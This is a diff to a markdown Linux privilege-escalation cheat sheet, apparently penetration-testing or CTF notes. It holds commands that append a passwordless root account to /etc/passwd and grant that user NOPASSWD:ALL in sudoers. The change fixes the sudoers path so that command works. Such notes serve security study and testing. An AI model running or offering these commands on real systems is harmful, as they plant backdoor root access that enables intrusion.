@@ -7,7 +7,7 @@
 - `find / -writable 2>/dev/null | grep home | cut -d "/" -f 2,3 | sort -u`<br>
 - `sudo -V` to check sudo version, which might be vulnerable.<br>
 - `echo "vickie::0:0:System Administrator:/root/root:/bin/bash" >> /etc/passwd`<br>
-- `echo "vickie ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoer`<br>
+- `echo "vickie ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers`<br>
 - 'groups`<br>
 https://gtfobins.github.io/<br>
 <hr>
